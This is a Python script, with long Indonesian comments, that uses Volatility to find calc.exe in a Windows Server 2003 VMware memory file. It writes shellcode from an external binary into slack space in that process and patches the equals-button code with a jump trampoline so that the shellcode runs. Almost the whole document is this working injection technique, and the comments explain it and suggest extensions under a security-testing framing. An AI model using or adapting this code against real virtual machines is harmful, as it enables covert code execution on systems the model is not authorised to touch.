import sys
import struct
import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrspace as addrspace
import volatility.plugins.taskmods as taskmods

equals_button = 0x01005D51

memory_file = "/Users/justin/Documents/Virtual Machines.localized/" \
              "Windows Server 2003 Standard Edition.vmwarevm/" \
              "564d9400-1cb2-63d6-722b-4ebe61759abd.vmem"
slack_space = None
trampoline_offset = None

# read in our shellcode
sc_fd = open("cmeasure.bin", "rb")
sc = sc_fd.read()
sc_fd.close()

sys.path.append("/Downloads/volatility-2.3.1")

registry.PluginImporter()
config = conf.ConfObject()

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSpace)

config.parse_options()
config.PROFILE = "Win2003SP2x86"
config.LOCATION = "file://%s" % memory_file

p = taskmods.PSList(config)

for process in p.calculate():
    if str(process.ImageFileName) == "calc.exe":
        print("[*] Found calc.exe with PID %d" % process.UniqueProcessId)
        print("[*] Hunting for physical offsets...please wait.")

        address_space = process.get_process_address_space()
        pages = address_space.get_available_pages()

        for page in pages:
            physical = address_space.vtop(page[0])
            if physical is not None:
                if slack_space is None:
                    fd = open(memory_file, "r+")
                    fd.seek(physical)
                    buf = fd.read(page[1])
                    try:
                        offset = buf.index("\x00" * len(sc))
                        slack_space = page[0] + offset

                        print("[*] Found good shellcode location!")
                        print("[*] Virtual address: 0x%08x" % slack_space)
                        print("[*] Physical address: 0x%08x" % (
                                physical + offset))
                        print("[*] Injecting shellcode.")

                        fd.seek(physical + offset)
                        fd.write(sc.decode())
                        fd.flush()

                        # create our trampoline
                        tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
                        tramp += "\xff\xe3"

                        if trampoline_offset is not None:
                            break

                    except:
                        pass

                    fd.close()

                # check for our target code location
                if page[0] <= equals_button < ((page[0] + page[1]) - 7):

                    # calculate virtual offset
                    v_offset = equals_button - page[0]

                    # now calculate physical offset
                    trampoline_offset = physical + v_offset

                    print("[*] Found our trampoline target at: 0x%08x" % (
                        trampoline_offset))
                    if slack_space is not None:
                        break

        print("[*] Writing trampoline...")

        fd = open(memory_file, "r+")
        fd.seek(trampoline_offset)
        fd.write(tramp)
        fd.close()

        print("[*] Done injecting code.")

# ===============================================================# 

# Program ini adalah sebuah skrip Python yang digunakan untuk injeksi shellcode ke dalam proses "calc.exe" pada sistem Windows Server 2003. Berikut adalah penjelasan alur kerjanya:

# 1. **Impor Modul dan Pengaturan Awal:**
#    - Program mengimpor modul-modul yang diperlukan seperti `sys`, `struct`, `volatility`, dan lain-lain.
#    - Variabel `equals_button` diberikan nilai yang mewakili alamat instruksi dalam proses "calc.exe" di mana shellcode akan diinjeksikan.
#    - Variabel `memory_file` menunjukkan lokasi file memori yang akan dianalisis.

# 2. **Membaca Shellcode:**
#    - Program membaca shellcode dari file biner yang disimpan dalam variabel `sc`.

# 3. **Konfigurasi Volatility:**
#    - Pengaturan konfigurasi untuk memproses file memori menggunakan Volatility ditetapkan, seperti profile sistem dan lokasi file memori yang akan dianalisis.

# 4. **Mencari Proses "calc.exe":**
#    - Program mencari proses "calc.exe" dalam file memori yang sedang dianalisis menggunakan plugin `taskmods.PSList`.

# 5. **Mencari Lokasi Penyisipan Shellcode:**
#   - Setelah menemukan proses "calc.exe", program mencari ruang kosong di memori (slack space) yang cukup besar untuk menyisipkan shellcode.
#    - Program memindai halaman-halaman memori untuk menemukan ruang kosong dan mencari posisi di mana shellcode dapat disisipkan.
#    - Setelah menemukan lokasi yang cocok, shellcode disisipkan ke dalam memori.

# 6. **Mencari Lokasi Trampoline Target:**
#    - Program mencari lokasi target trampoline di mana alamat instruksi `equals_button` akan diarahkan setelah penginjeksian shellcode.
#    - Program memeriksa halaman-halaman memori untuk menemukan lokasi target trampoline.
#    - Setelah menemukan lokasi yang cocok, trampoline dibuat dan disisipkan ke dalam memori.

# 7. **Penyisipan Trampoline:**
#    - Trampoline disisipkan ke dalam lokasi target di memori.

# 8. **Selesai:**
#    - Setelah selesai, program mencetak pesan yang memberi tahu bahwa injeksi kode telah selesai.

# Alur program ini secara keseluruhan adalah untuk mencari, mempersiapkan, dan menyisipkan shellcode ke dalam proses "calc.exe" serta membuat trampoline untuk mengalihkan alur eksekusi ke shellcode yang disisipkan.  

# =================================================================================================================================================================================================================================== 

# ### Fungsi:

# 1. **Injeksi Shellcode:**
#    - Program ini berfungsi untuk menyisipkan shellcode ke dalam proses "calc.exe" pada sistem Windows Server 2003.
#    - Shellcode ini dapat digunakan untuk melakukan eksekusi kode yang diinginkan oleh pengguna, seperti menjalankan perintah tertentu atau memanipulasi sistem.

# 2. **Trampoline Creation:**
#    - Program juga menciptakan trampoline, yaitu sepotong kode yang ditempatkan di lokasi target dalam memori yang akan mengarahkan eksekusi program ke shellcode yang telah disisipkan.
#    - Trampoline ini memungkinkan aliran eksekusi program untuk dialihkan secara langsung ke shellcode yang disisipkan setelah suatu kondisi tertentu dipenuhi.

### Manfaat:

# 1. **Pemecahan Masalah:**
#    - Program ini dapat digunakan untuk tujuan debugging dan pemecahan masalah, terutama dalam menguji keamanan sistem dengan menyisipkan shellcode dan memeriksa reaksi sistem terhadapnya.

# 2. **Pengujian Keamanan:**
#    - Dengan menyisipkan shellcode ke dalam proses "calc.exe", program ini memungkinkan pengguna untuk menguji keamanan sistem dengan menguji apakah sistem mampu mendeteksi dan melawan serangan melalui injeksi kode.

### Cara Penggunaan:

# 1. **Persiapan Shellcode:**
#    - Pengguna perlu menyiapkan shellcode yang ingin disisipkan ke dalam proses "calc.exe". Shellcode dapat diprogram untuk melakukan berbagai tindakan, seperti memuat perintah atau exploit tertentu.

# 2. **Menentukan Lokasi File Memori:**
#    - Pengguna perlu menentukan lokasi file memori yang akan dianalisis. Lokasi file memori ini harus sesuai dengan proses "calc.exe" yang akan diinjeksikan shellcode.

# 3. **Menjalankan Program:**
#    - Pengguna menjalankan skrip Python ini dengan memasukkan shellcode yang telah disiapkan dan menentukan lokasi file memori sebagai input.

# 4. **Memantau Output:**
#    - Setelah skrip dijalankan, pengguna dapat memantau output program untuk melihat apakah injeksi shellcode berhasil dan trampoline berhasil dibuat.

### Pengembangan:

# 1. **Penanganan Kesalahan:**
#    - Dalam pengembangan selanjutnya, program dapat ditingkatkan dengan menambahkan penanganan kesalahan yang lebih baik, seperti penanganan kesalahan saat mencari lokasi yang tepat untuk penyisipan shellcode atau trampoline.

# 2. **Peningkatan Fungsionalitas:**
#    - Program ini dapat ditingkatkan dengan menambahkan fungsionalitas tambahan, seperti kemampuan untuk mengubah target proses, memantau respons sistem terhadap injeksi shellcode, atau melakukan aksi lebih lanjut setelah injeksi berhasil.

# 3. **Optimisasi Kinerja:**
#    - Dalam pengembangan selanjutnya, perlu dipertimbangkan untuk mengoptimalkan kinerja program, terutama saat mencari lokasi yang tepat untuk menyisipkan shellcode dan trampoline.

# 4. **Penambahan Fitur Keamanan:**
#    - Program ini juga dapat ditingkatkan dengan menambahkan fitur keamanan tambahan, seperti validasi shellcode sebelum injeksi atau deteksi serangan yang mencoba memanipulasi atau memodifikasi program ini.

# Dengan memperhatikan aspek-aspek ini, program ini dapat dikembangkan lebih lanjut untuk meningkatkan fungsionalitasnya, keamanannya, dan membantu pengguna dalam menguji dan menganalisis keamanan sistem mereka.
